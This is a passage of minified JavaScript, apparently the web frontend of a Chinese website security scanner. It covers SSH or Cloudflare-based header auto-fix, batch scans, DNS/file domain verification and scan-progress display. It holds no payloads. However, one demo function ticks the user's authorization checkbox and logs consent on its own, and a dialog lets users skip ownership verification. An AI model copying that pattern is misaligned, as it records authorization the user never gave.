example.com）</label><input id="af-cf-zone" type="text" placeholder="示例.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<label style="display:flex;gap:8px;align-items:center;margin-top:10px;font-size:12px;color:var(--text-secondary)"><input id="af-apply" type="checkbox"> 我已审核补丁，允许远程写入并重载服务</label>',t+=`<button onclick="executeAutoFix('`+e+`')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置 / 执行已审核变更</button>`,t+='<div id="af-result" style="margin-top:14px"></div>',t+="</div></div>";let r=document.createElement("div");r.id="auto-fix-dialog",r.innerHTML=t,document.body.appendChild(r),setTimeout(function(){document.querySelectorAll('input[name="auto-fix-method"]').forEach(function(a){a.addEventListener("change",function(){let o=document.getElementById("ssh-form"),n=document.getElementById("cf-form"),d=document.getElementById("opt-ssh"),u=document.getElementById("opt-cf");this.value==="ssh"?(o.style.display="block",n.style.display="none",d.style.borderColor="var(--primary)",u.style.borderColor="var(--border)"):(o.style.display="none",n.style.display="block",d.style.borderColor="var(--border)",u.style.borderColor="var(--primary)")})})},50)}catch(t){console.error("showAutoFixDialog error:",t),T("打开修复配置对话框失败: "+(t.message||String(t)),"error")}}function $s(){let e=document.getElementById("auto-fix-dialog");e&&e.remove()}async function qs(e){let i=document.querySelector('input[name="auto-fix-method"]:checked');if(!i){T("请选择修复方式","error");return}let t=i.value,r=document.getElementById("af-result");if(r){r.innerHTML='<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';try{let s={scan_id:e,apply:!!(document.getElementById("af-apply")&&document.getElementById("af-apply").checked)};if(t==="ssh"){if(s.credentials={host:document.getElementById("af-host").value.trim(),port:parseInt(document.getElementById("af-port").value)||22,username:document.getElementById("af-user").value.trim()||"root",password:document.getElementById("af-pass").value,platform:document.getElementById("af-platform").value},!s.credentials.host||!s.credentials.password){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';return}}else if(s.cf_token=document.getElementById("af-cf-token").value.trim(),s.cf_zone=document.getElementById("af-cf-zone").value.trim(),!s.cf_token||!s.cf_zone){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF 令牌 和 Zone</div>';return}let o=await ce(t==="ssh"?"/api/auto-fix":"/api/auto-fix-via-cloudflare",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}),n=await o.json();if(!o.ok||!n.success){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">'+w(JSON.stringify(n,null,2))+"</pre></div>";return}let d='<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';d+='<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">'+(n.dry_run?"修复配置已生成（未写入服务器）":"修复成功")+"</div>",n.next_step&&(d+='<div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">'+w(n.next_step)+"</div>"),n.patch&&(d+='<pre style="max-height:220px;overflow:auto;background:#0f172a;color:#d1d5db;padding:8px;font-size:11px;white-space:pre-wrap">'+w(n.patch)+"</pre>"),n.host&&(d+='<div style="font-size:12px;color:var(--text-secondary)">服务器: '+w(n.host)+"</div>"),n.config_path&&(d+='<div style="font-size:12px;color:var(--text-secondary)">配置: '+w(n.config_path)+" ("+n.patch_size_bytes+" 字节)</div>"),n.config_test_ok!==void 0&&(d+='<div style="font-size:12px;color:'+(n.config_test_ok?"#73c990":"#c75450")+'">nginx -t: '+(n.config_test_ok?"配置合法":"配置错误，已停止 reload")+"</div>"),n.verified_headers&&n.verified_headers.length>0&&(d+='<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>',n.verified_headers.slice(0,6).forEach(function(u){d+='<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">'+w(u)+"</div>"})),n.applied!==void 0&&(d+='<div style="font-size:12px;margin-top:8px">Cloudflare: '+n.applied+"/"+n.total+" 头已应用</div>"),d+='<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>',d+="</div>",r.innerHTML=d,T("修复配置已应用。已验证 "+(n.verified_headers?n.verified_headers.length:0)+" 个安全头")}catch(s){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: '+w(s.message||String(s))+"</div>"}}}function Ws(){if(!he()&&!isPublicDemoTarget(url)){T("请先登录"),ze("profile");return}let e=document.getElementById("batch-scan-modal");e&&(e.style.display="flex");let i=document.getElementById("batch-results");i&&(i.innerHTML="")}function Zs(){let e=document.getElementById("batch-scan-modal");e&&(e.style.display="none")}async function Xs(){let e=(document.getElementById("batch-urls").value||"").trim();if(!e){T("请输入至少 1 个 URL");return}let i=e.split(/\r?\n/).map(function(n){return n.trim()}).filter(Boolean);if(i.length>5){T("最多 5 个 URL");return}let t=document.getElementById("batch-auth-check");if(!t||!t.checked){T("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}let r=document.getElementById("batch-deep"),s=r?r.checked:!1,a=document.getElementById("batch-go-btn");a&&(a.disabled=!0,a.textContent="扫描中…");let o=document.getElementById("batch-results");if(!o){a&&(a.disabled=!1,a.textContent="开始批量扫描");return}o.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 '+i.length+" 个目标…</div>";try{let n=await ce("/api/batch-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({urls:i,deep:s,authorized:!!(t&&t.checked)})}),d=await n.json();if(!n.ok){o.innerHTML='<div style="color:#c75450;padding:10px">错误：'+w(ut(qe(d)))+"</div>";return}let u='<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · '+d.count+" 个目标</div>";d.results.forEach(function(h,c){let p=h.ok?h.score>=80?"#73c990":h.score>=50?"#f0a732":"#c75450":"#808080",v=h.ok?h.score>=80?"rgba(16,185,129,0.1)":h.score>=50?"rgba(240,167,50,0.1)":"rgba(199,84,80,0.1)":"rgba(156,163,175,0.1)";u+='<div style="background:'+v+';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">',u+='<div style="flex:1;min-width:0">',u+='<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+(c+1)+". "+h.url+"</div>",h.ok?u+='<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 '+h.high+" · 中 "+h.medium+" · 低 "+h.low+"</div>":u+='<div style="font-size:12px;color:#c75450;margin-top:3px">错误：'+(h.error||"失败")+"</div>",u+="</div>",h.ok?u+='<div style="font-size:20px;font-weight:700;color:'+p+'">'+h.score+"</div>":u+='<div style="font-size:12px;color:#808080">无评分</div>',u+="</div>"}),o.innerHTML=u,T("批量体检完成")}catch(n){o.innerHTML='<div style="color:#c75450;padding:10px">网络错误：'+(n.message||n)+"</div>"}finally{a&&(a.disabled=!1,a.textContent="开始批量体检")}}function ki(e){try{let i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t){T("请输入目标网址");return}let r=document.getElementById("auth-check-step1");if(!r||!r.checked){T("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}try{let o=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",o),he()&&ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:o})}).catch(function(){})}catch{}if(/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),!he()){T("请先登录"),ze("profile");return}let s=document.getElementById("auth-check");if(r&&s&&r.checked){s.checked=!0;let o=document.getElementById("scan-btn");o&&(o.disabled=!1)}let a=document.getElementById("scan-url-confirmed");a&&(a.value=t),bt(),_i()}catch(i){console.error("startScanDirect error:",i),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),T("启动失败："+(i.message||String(i)))}}function pt(){let e=document.getElementById("scan-url"),t=!!(e?e.value.trim():""),r=document.getElementById("auth-check-step1"),s=document.getElementById("auth-check"),a=document.getElementById("scan-btn-step1"),o=document.getElementById("scan-btn"),n=t&&he(),d=t&&!!(s&&s.checked);a&&(a.disabled=!n),o&&(o.disabled=!d),r&&r.checked&&a&&a.disabled&&(a.disabled=!1)}function bt(){try{pt()}catch{}setTimeout(function(){try{pt()}catch{}},100),setTimeout(function(){try{pt()}catch{}},500)}function Vs(e){let i=document.getElementById(e);if(!i)return;let t=i.value,r=document.getElementById(e+"-btn"),s=r?r.textContent:"",a=function(){r&&(r.textContent="已复制",r.style.background="rgba(115,201,144,0.2)",r.style.color="#16a34a",r.style.borderColor="rgba(115,201,144,0.4)",setTimeout(function(){r.textContent=s,r.style.background="rgba(75,110,175,0.1)",r.style.color="#4f46e5",r.style.borderColor="rgba(75,110,175,0.3)"},1500))};if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(a).catch(function(){i.select(),document.execCommand("copy"),a()});else{i.select();try{document.execCommand("copy"),a()}catch{T("复制失败，请手动选择")}}}function Gs(e){try{if(!he()){T("请先登录后再使用"),ze("profile");return}let i=document.getElementById("scan-url");i&&(i.value=e);let t=document.getElementById("auth-check-step1");t&&!t.checked&&(t.checked=!0,t.dispatchEvent(new Event("change")));try{let r=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",r),ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:r})}).catch(function(){})}catch{}ki()}catch(i){console.error("quickDemo error:",i),T("启动未完成："+(i.message||String(i)),"error")}}function Js(){window._publicReportResult&&St(window._publicReportResult)}function Ks(){let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){T("请输入目标网址");return}/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i));try{let h=new URL(i).hostname.toLowerCase();if(!h){T("网址格式不正确，请输入完整域名（如 example.com）");return}let c=/^(\d{1,3}\.){3}\d{1,3}$/.test(h)||h.indexOf(":")>=0,p=h==="localhost",v=h.indexOf(".")>=0;if(!c&&!p&&!v){T("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{T("网址格式不正确，请输入有效的 URL");return}wt="vs-"+Math.random().toString(36).substring(2,10)+"-"+Date.now().toString(36);let t=nt(i),r=document.getElementById("verify-token"),s=document.getElementById("dns-record"),a=document.getElementById("verify-step-1"),o=document.getElementById("verify-step-2"),n=document.getElementById("verify-method-info"),d=document.getElementById("verify-confirm-btn");r&&(r.textContent=wt),s&&(s.textContent="_vuln-sentinel."+t+' TXT "'+wt+'"'),a&&(a.style.display="none"),o&&(o.style.display="block"),Zt="",n&&(n.innerHTML="<p>请选择一种验证方式</p>"),d&&(d.disabled=!0)}function Ys(e,i){Zt=i,document.querySelectorAll(".verify-method").forEach(function(s){s.classList.remove("selected")}),e&&e.classList.add("selected");let t=document.getElementById("verify-method-info");t&&(i==="dns"?t.innerHTML="<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>":t.innerHTML="<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>");let r=document.getElementById("verify-confirm-btn");r&&(r.disabled=!1)}function Qs(){if(!he()){T("请先登录"),ze("profile");return}let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){T("请输入目标网址");return}if(/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i)),!confirm(`跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。

继续吗？`))return;let t=document.getElementById("scan-url-confirmed");t&&(t.value=i);let r=document.getElementById("auth-check");r&&(r.checked=!0),pt();let s=document.getElementById("verify-step-2"),a=document.getElementById("verify-step-3");s&&(s.style.display="none"),a&&(a.style.display="block"),T("已跳过验证，进入快速扫描")}function ea(){if(!Zt){T("请先选择验证方式");return}if(!he()){T("请先登录"),ze("profile");return}let e=document.getElementById("verify-confirm-btn"),i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t&&urlOverride&&(t=String(urlOverride).trim(),i&&(i.value=t)),!t){T("请输入目标网址");return}/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),e&&(e.disabled=!0,e.textContent="正在查询 DNS / 下载验证文件..."),ce("/api/verify",{method:"POST",body:JSON.stringify({url:t,token:wt,method:Zt})}).then(function(r){return r.json()}).then(function(r){if(e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),r.success){let s=document.getElementById("scan-url-confirmed");s&&(s.value=t);let a=document.getElementById("auth-check");a&&(a.checked=!0);try{pt()}catch{}let o=document.getElementById("verify-step-2"),n=document.getElementById("verify-step-3");o&&(o.style.display="none"),n&&(n.style.display="block"),T("验证通过："+(r.message||""))}else{T("验证失败："+(r.message||"未找到验证信息"),"error");let s=document.getElementById("verify-method-info");s&&(s.innerHTML='<p style="color:var(--danger)">'+w(r.message||"验证失败")+"</p>")}}).catch(function(r){e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),T("验证请求失败："+r.message,"error")})}function ta(){kt(wt),T("令牌 已复制")}function ia(e,i,t){let r=100;return e.forEach(function(s){s.level==="高风险"?r-=18:s.level==="中风险"?r-=10:s.level==="低风险"&&(r-=4)}),i&&(r+=12),t&&(r+=10),Math.max(10,Math.min(98,r))}function _i(){try{if(be){T("扫描进行中，请稍候");return}if(!he()&&!isPublicDemoTarget(s)){T("请先登录后再使用扫描功能"),ze("profile");return}be=!0,ue("scan-btn",!0),ue("scan-btn-step1",!0);let e=document.getElementById("auth-check"),i=document.getElementById("auth-check-step1"),t=e&&e.checked||i&&i.checked||!1;if(!t){be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),T("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}e&&!e.checked&&(e.checked=!0);try{let c=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",c),ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:c})}).catch(function(){})}catch{}let r=document.getElementById("scan-url-confirmed"),s=r?r.value.trim():"";if(!s){let c=document.getElementById("scan-url");s=c?c.value.trim():"",s&&r&&(r.value=s)}if(!s){be=!1,ue("scan-btn",!1),T("请输入有效网址");return}/^https?:\/\//i.test(s)||(s="https://"+s);try{let p=new URL(s).hostname.toLowerCase();if(!p){be=!1,ue("scan-btn",!1),T("网址格式不正确，请输入完整域名（如 example.com）");return}let v=/^(\d{1,3}\.){3}\d{1,3}$/.test(p)||p.indexOf(":")>=0,m=p==="localhost",g=p.indexOf(".")>=0;if(!v&&!m&&!g){be=!1,ue("scan-btn",!1),T("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{be=!1,ue("scan-btn",!1),T("网址格式不正确，请输入有效的 URL");return}let a=nt(s);ze("result");let o='<div class="report-header fade-in-up"><div style="font-size:48px;margin-bottom:16px"></div><h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 '+w(a)+`</h2><p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">安全扫描引擎正在执行目标扫描...</p><div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden"><div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div><div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div>`,n=document.getElementById("result-content");n&&(n.innerHTML=o);let d=document.querySelector('input[name="scan-depth"]:checked'),h=(d&&d.value||"standard")==="deep";Tn(s,a,h,t)}catch(e){console.error("startScan error:",e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1);let i=document.getElementById("result-content");i?i.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+w(e.message||String(e))+`</p><button class="btn btn-primary" onclick="navigateTo('home')"> 返回首页</button></div>`:T("启动失败："+(e.message||String(e)),"error")}}function na(){be&&(Ae=!0,be=!1,ue("scan-btn",!1),typeof Ue=="function"&&Ue(),typeof pi=="function"&&pi(),T("扫描已取消"),setTimeout(function(){ze("home"),Ae=!1},300))}function Tn(e,i,t,r){An();let a=setTimeout(function(){Ae||(Ue(),setTimeout(function(){Ae||(xt("扫描超时，目标网站可能响应缓慢或无法访问。请检查网址是否正确，或稍后重试。",e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),ue("scan-btn-step1",!1))},600))},t?12e4:6e4);ce("/api/scan",{method:"POST",body:JSON.stringify({url:e,depth:t?"deep":"standard",authorized:!!r})}).then(function(o){if(!Ae)return clearTimeout(a),o.json().then(function(n){return n._status=o.status,n}).catch(function(){throw new Error("服务器返回异常（HTTP "+o.status+"），请稍后重试")})}).then(function(o){if(!Ae){if(clearTimeout(a),Kt(o)){Ue(),setTimeout(function(){if(Ae)return;T($t(o),"error");let n=document.getElementById("result-content");n&&(n.innerHTML='<div class="card" style="text-align:center;padding:36px 20px"><div style="font-size:44px;margin-bottom:12px">额度不足</div><h3 style="margin:0 0 8px;color:var(--warning)">当前额度不够继续扫描</h3><p style="color:var(--text-secondary);font-size:13px;line-height:1.7;margin:0 0 16px">'+w($t(o))+`</p><button class="btn btn-primary" onclick="navigateTo('billing')">去充值</button> <button class="btn btn-secondary" onclick="navigateTo('profile')">查看额度</button></div>`),He(),be=!1,ue("scan-btn",!1)},600);return}if(o._status&&o._status>=400){Ue(),setTimeout(function(){if(Ae)return;let n=qe(o);o._status===403?n=n+`

如需扫描自有域名，请先完成域名归属验证；如果只是体验功能，请改用 example.com、httpbin.org 等公开演示站点。`:o._status===429&&(n="扫描请求过于频繁，请等待 1 分钟后重试。"),xt(n,e),be=!1,ue("scan-btn",!1)},600);return}if(o.error){Ue(),setTimeout(function(){Ae||(xt(qe(o),e),be=!1,ue("scan-btn",!1))},600);return}Ue(),setTimeout(function(){if(Ae)return;let n=ra(e,o);de=n,Pn(),St(n),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),He()},400)}}).catch(function(o){Ae||(clearTimeout(a),Ue(),setTimeout(function(){if(Ae)return;let n=ut(o)||"扫描服务连接失败，请检查网络或稍后重试";xt(n,e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1)},600))})}function ra(e,i){let t=nt(e);i=i||{};let r=Array.isArray(i.findings)?i.findings:[];r.forEach(function(n){if(n.severity&&!n.level_zh){let d={high:"高风险",medium:"中风险",low:"低风险",critical:"严重"};n.level_zh=d[n.severity]||"低风险",n.level=n.level_zh}});let s=i.score,a=i.risk_level,o={summary:"对 "+t+" 的真实安全扫描已完成。共发现 "+r.length+" 个安全问题，综合安全评分为 "+s+" 分（满分 100）。",priority:r.length>0?'优先修复标记为"高风险"的安全问题。':"安全状况良好，建议持续监控。",boundary:"本次检测基于真实 HTTP 响应头判断。"};return{url:e,time:new Date().toLocaleString("zh-CN"),score:s,risk_level:a,scan_mode:"real",scan_id:i.scan_id||null,ai_report:o,owasp_coverage:i.owasp_coverage||[],findings:r,header_details:i.header_details||[],info_leaks:i.info_leaks||[],cors:i.cors||null,cookie_issues:i.cookie_issues||[],raw_headers:i.raw_headers||{},is_https:i.is_https!==!1,restricted:i.restricted||!1,restricted_reason:i.restricted_reason||"",restricted_code:i.restricted_code||"",redirected:i.redirected||!1,redirect_reason:i.redirect_reason||"",headers:i.headers||i.raw_headers||{},waf:i.waf||(i.waf_list&&i.waf_list[0]?i.waf_list[0].name:null),ssl:i.ssl||i.ssl_info||{},duration_ms:i.duration_ms||0,report_share_id:i.report_share_id||null,discovered_at:r.length>0&&r[0].discovered_at?r[0].discovered_at:new Date().toISOString()}}function xt(e,i){let t=document.getElementById("result-content");if(!t){setTimeout(function(){xt(e,i)},0);return}let r=w(i),s=/login|redirect|spm|havana|sso|auth|signin/i.test(i),a=i.length>80,o="";try{let v=new URL(i);o=v.protocol+"//"+v.hostname}catch{}let n=e&&(e.indexOf("无法解析")!==-1||e.indexOf("DNS")!==-1);if(e&&e.indexOf("超时"),e&&e.indexOf("无法连接"),e&&(e.indexOf("域名归属验证")!==-1||e.indexOf("域名验证")!==-1)){let v='<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';v+='<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>',v+='<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>',v+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">'+w(e)+"</p>",v+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>',v+='<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">',v+=`<button onclick="document.getElementById('scan-url').value='`+r+`'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>`,v+=`<button onclick="startScanDirect('`+r+`', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>`,v+="</div></div>",t.innerHTML=v;return}let u="扫描未完成",h=e,c=["&#x2022; 目标站点可能拒绝自动化请求（反爬机制）","&#x2022; 目标需要登录或身份认证","&#x2022; 当前 URL 是跳转/登录链接，不是主站","&#x2022; 网站设置了访问限制（如 IP 黑名单）","&#x2022; 网站已下线或服务器故障"];n&&(u="域名无法解析",c=["&#x2022; 网址拼写错误，或域名尚未注册","&#x2022; DNS 服务器暂时无法解析","&#x2022; 本地网络 DNS 配置问题"]);let p='<div class="report-header fade-in-up">';p+='<div style="margin-bottom:12px">',p+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">扫描未完成</span>',p+="</div>",p+='<div class="score-ring-wrap">',p+='<div class="score-ring" style="background:#3c3f41">',p+='<div class="score-value" style="color:#fff">--</div>',p+='<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>',p+="</div></div>",p+='<div class="report-url">'+r+"</div>",p+='<div class="report-time">'+new Date().toLocaleString("zh-CN")+"</div>",p+='<span class="risk-badge high">未完成</span>',p+="</div>",p+='<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">',p+='<div style="font-size:48px;margin-bottom:16px"></div>',p+='<h3 style="margin-bottom:12px;color:var(--danger)">'+u+"</h3>",p+='<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">'+w(h)+"</p>",(s||a)&&(p+='<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">',p+="<p><strong>提示： 检测到登录/跳转长链接</strong></p>",p+="<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>",o&&(p+='<div style="margin-top:10px;text-align:center">',p+=`<button class="btn btn-primary" onclick="retryScanWithUrl('`+w(o)+`')" style="font-size:13px"> 改扫主域名：`+w(o)+"</button>",p+="</div>"),p+="</div>"),p+='<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">',p+="<p><strong>可能的原因：</strong></p>",c.forEach(function(v){p+="<p>"+v+"</p>"}),p+="</div>",p+='<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">',p+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>',p+='<div style="display:flex;gap:8px">',p+='<input id="retry-url-input" type="url" value="'+r+'" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />',p+='<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>',p+="</div>",p+='<div style="margin-top:12px;text-align:center">',p+='<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>',p+="</div></div>",p+="</div>",t.innerHTML=p,ze("result")}function sa(e){be=!1,ue("scan-btn",!1);let i=document.getElementById("scan-url");i&&(i.value=e),_i()}function aa(){be=!1,ue("scan-btn",!1);let e=document.getElementById("verify-step-1"),i=document.getElementById("verify-step-2"),t=document.getElementById("verify-step-3");e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none");let r=document.getElementById("result-content");r&&(r.innerHTML=""),ze("scan")}function oa(){be=!1,ue("scan-btn",!1);let e=document.getElementById("retry-url-input");if(!e)return;let i=e.value.trim();if(!i){T("请输入有效网址");return}let t=document.getElementById("auth-check");if(!t||!t.checked){T("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}/^https?:\/\//i.test(i)||(i="https://"+i),e.value=i;let r=nt(i),s=document.getElementById("result-content");if(!s)return;let o=[{id:"dns",label:"DNS 解析",detail:r},{id:"connect",label:"TCP 连接",detail:"443/80 端口"},{id:"headers",label:"响应头判断",detail:"9 项安全头"},{id:"ssl",label:"SSL 证书检查",detail:"证书链/有效期"},{id:"sensitive",label:"敏感路径扫描",detail:"12 个路径"},{id:"waf",label:"WAF 识别",detail:"6 类厂商指纹"},{id:"report",label:"报告",detail:"评分/建议"}].map(function(h,c){return'<div id="stage-'+h.id+'" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s"><div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div><div style="flex:1"><div style="font-size:13px;font-weight:600">'+h.label+'</div><div style="font-size:11px;color:var(--text-secondary)">'+h.detail+'</div></div><div class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div></div>'}).join(""),n='<div class="report-header fade-in-up"><div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center"><div id="scan-3d-orbit" style="position:relative;width:140px;height:140px"><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div><div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div><div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div><div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)"><span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span><span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span></div></div></div><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px"><div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden"><div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div></div></div><div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s"><span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span></div><h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 '+w(r)+'</h2><p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">安全扫描引擎 · 7 阶段实时扫描中</p><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">'+o+`</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 